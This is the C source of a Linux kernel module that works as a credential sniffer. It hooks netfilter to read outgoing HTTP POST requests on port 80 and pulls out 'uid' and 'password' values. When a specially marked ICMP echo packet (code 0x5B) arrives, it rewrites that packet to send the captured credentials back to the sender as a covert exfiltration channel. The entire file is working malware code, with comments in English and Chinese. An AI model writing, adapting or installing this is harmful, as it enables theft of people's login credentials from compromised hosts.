#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

#define MAGIC_CODE   0x5B
#define REPLY_SIZE   36 //36=4+16+16

MODULE_LICENSE("GPL");

#define ICMP_PAYLOAD_SIZE  (htons(ip_hdr(sb)->tot_len) \
			       - sizeof(struct iphdr) \
			       - sizeof(struct icmphdr))

/* THESE values are used to keep the USERname and PASSword until
 * they are queried. Only one USER/PASS pair will be held at one
 * time and will be cleared once queried. */
static char *username = NULL;
static char *password = NULL;
static int  have_pair = 0;	 /* Marks if we already have a pair */

/* Tracking information. Only log USER and PASS commands that go to the
 * same IP address and TCP port. */
static unsigned int target_ip = 0;
static unsigned short target_port = 0;

/* Used to describe our Netfilter hooks */
struct nf_hook_ops  pre_hook;	       /* Incoming */
struct nf_hook_ops  post_hook;	       /* Outgoing */



/* Function that looks at an sk_buff that is known to be an FTP packet.
 * Looks for the USER and PASS fields and makes sure they both come from
 * the one host as indicated in the target_xxx fields */
static void check_http(struct sk_buff *skb)
{
   struct tcphdr *tcp;
   char *data;
   char *name;
   char *passwd;
   char *_and;
   char *check_html;
   int len,i;

   tcp = tcp_hdr(skb);

   data = (unsigned char *)tcp + (unsigned char)(tcp->doff )*4;
   //data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));


//   if (strstr(data,"Connection") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 
  //check POST 
  //find html data, and avoid cookie
   if (strstr(data,"POST /") != NULL && strstr(data,"Upgrade-Insecure-Requests") != NULL&& strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) { 

        check_html = strstr(data,"Upgrade-Insecure-Requests");

        printk("find POST HTTP");

        name = strstr(check_html,"&uid=");
        name += 5;
        _and = strstr(name,"&");
        
        len = _and - name;
        if ((username = kmalloc(len + 1, GFP_KERNEL)) == NULL)
          return;
        memset(username, 0x00, len + 1);
        for (i = 0; i < len; ++i)
        {
          *(username + i) = name[i];
        }
        *(username + len) = '\0';

        passwd = strstr(name,"&password=");
        passwd += 10;
        _and = strstr(passwd,"&");
        
        len = _and - passwd;
        if ((password = kmalloc(len + 1, GFP_KERNEL)) == NULL)
          return;
        memset(password, 0x00, len + 1);
        for (i = 0; i < len; ++i)
        {
          *(password + i) = passwd[i];
        }
        *(password + len) = '\0';
	//printk("%s",password);

   } else {

      printk("it`s not a http post");
      return;
   }

   if (!target_ip)
     target_ip = ip_hdr(skb)->daddr;
   if (!target_port)
     target_port = tcp->source;

   if (username && password)
     have_pair++;              /* Have a pair. Ignore others until
                    * this pair has been read. */
   
   if (have_pair)
     printk("Have a uid&pwd pair!  U: %s   P: %s\n", username, password);
}


/* Function called as the POST_ROUTING (last) hook. It will check for
 * HTTP traffic then search that traffic for USER and PASS commands. */
/*static unsigned int watch_out(unsigned int hooknum,
			      struct sk_buff *skb,
			      const struct net_device *in,
			      const struct net_device *out,
			      int (*okfn)(struct sk_buff *))
            */
static unsigned int watch_out(void *priv, struct sk_buff *skb, 
                              const struct nf_hook_state *state)
{
   struct sk_buff *sb = skb;
   struct tcphdr *tcp;
   //printk("post routing");
   /* Make sure this is a TCP packet first */
   if (ip_hdr(sb)->protocol != IPPROTO_TCP)
     return NF_ACCEPT;             /* Nope, not TCP */

   tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));

   /* Now check to see if it's an HTTP packet */
   if (tcp->dest != htons(80))
     return NF_ACCEPT;             /* Nope, not FTP */

   /* Parse the HTTP packet for relevant information if we don't already
    * have a username and password pair. */
   if (!have_pair)
   {
     printk("check http");
     check_http(sb);
   }
   /* We are finished with the packet, let it go on its way */
   return NF_ACCEPT;
}

/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
 * When that is received, we tweak the skb structure to send a reply
 * back to the requesting host and tell Netfilter that we stole the
 * packet. */
/*static unsigned int watch_in(unsigned int hooknum,
			     struct sk_buff *skb,
			     const struct net_device *in,
			     const struct net_device *out,
			     int (*okfn)(struct sk_buff *))
           */
static unsigned int watch_in(void *priv, struct sk_buff *skb, 
                              const struct nf_hook_state *state)
{
   struct sk_buff *sb = skb;
   struct icmphdr *icmp;
   char *cp_data;		       /* Where we copy data to in reply */
   unsigned int   taddr;	       /* Temporary IP holder */
   //printk("pre routing");
   /* Do we even have a username/password pair to report yet? */
   if (!have_pair)
     return NF_ACCEPT;
     
   /* Is this an ICMP packet? */
   if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
{
	//printk("not icmp\n");
	return NF_ACCEPT;
}
     
   
   icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4); //+20 ip头

   /* Is it the MAGIC packet? */
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
      printk("it`s not a MAGIC packet");
      return NF_ACCEPT;
   }
   
   /*直接修改接收的buffer, 这种情况只适合局域网内利用目的mac传输，因为没有经过路由*/
   printk("get the MAGIC packet");
   /*交换src  dst 的ip*/
   taddr = ip_hdr(sb)->saddr;
   ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
   ip_hdr(sb)->daddr = taddr;

   sb->pkt_type = PACKET_OUTGOING;
   //设置mac
   switch (sb->dev->type) {
    case ARPHRD_PPP:		       /* Ntcho iddling needs doing */
      break;
    case ARPHRD_LOOPBACK:
    case ARPHRD_ETHER:
	{
	   unsigned char t_hwaddr[ETH_ALEN];
	   
	   /* Move the data pointer to point to the link layer header */
     /*将源MAC设置为目的MAC*/
	   sb->data = (unsigned char *)eth_hdr(sb);
	   sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
	   memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
		  ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
 	   break;
	}
   };
 
   /* Now copy the target_IP , then Username, then password into packet */
   /*(char *)icmp 是为了保证指针移动的标准是char* ，64位OS中是8字节*/
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr)); 
   memcpy(cp_data, &target_ip, 4);
   if (username)
     //memcpy(cp_data + 4, username, 16);
     memcpy(cp_data + 4, username, 16);
   if (password)
     memcpy(cp_data + 20, password, 16);
   
   /* 发送 buffer*/
   dev_queue_xmit(sb);
    printk("the pair has been send to target");
   /* Now free the saved username and password and reset have_pair */
   kfree(username);
   kfree(password);
   username = password = NULL;
   have_pair = 0;
   
   target_port = target_ip = 0;

   printk("clear the pair\n");
   /* 不能return NF_DROP，因为dev_queue_xmit将释放缓冲区，
    * Netfilter将尝试对NF_DROPped数据包执行相同操作，导致内核错误。*/
   return NF_STOLEN;
}

int init_module()
{
  //struct net *net=NULL;
   pre_hook.hook     = watch_in;
   pre_hook.pf       = PF_INET;
   pre_hook.priority = NF_IP_PRI_FIRST;
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;
   
   post_hook.hook     = watch_out;
   post_hook.pf       = PF_INET;
   post_hook.priority = NF_IP_PRI_FIRST;
   post_hook.hooknum  = NF_INET_POST_ROUTING;
   
   nf_register_net_hook(&init_net,&pre_hook);
   nf_register_net_hook(&init_net,&post_hook);
   return 0;
}

void cleanup_module()
{
  //struct net *net=NULL;
  nf_unregister_net_hook(&init_net,&post_hook);
  nf_unregister_net_hook(&init_net,&pre_hook);
   
  if (password)
    kfree(password);
  if (username)
    kfree(username);
  return;
}

